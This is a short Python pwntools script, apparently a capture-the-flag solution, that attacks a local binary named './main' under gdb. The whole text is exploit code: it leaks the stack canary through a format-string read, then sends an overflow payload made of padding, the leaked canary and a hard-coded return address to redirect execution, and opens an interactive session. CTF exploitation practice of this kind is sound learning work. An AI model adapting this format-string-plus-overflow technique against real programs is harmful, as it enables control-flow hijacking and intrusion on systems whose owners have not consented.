from pwn import *
p = gdb.debug('./main','b * main')

p.sendline(b'%11$p')
p.recvuntil(b': ')
canary = p.recvline().strip()
canary = int(canary,16)
print("Canary: ",hex(canary))
p.sendline(b'n')

payload = b'A' * 24
payload += p64(canary)
payload += b'B' * 8
payload += p64(0x0000000000401176)
p.sendline(payload)

p.sendline(b'y')
p.interactive()
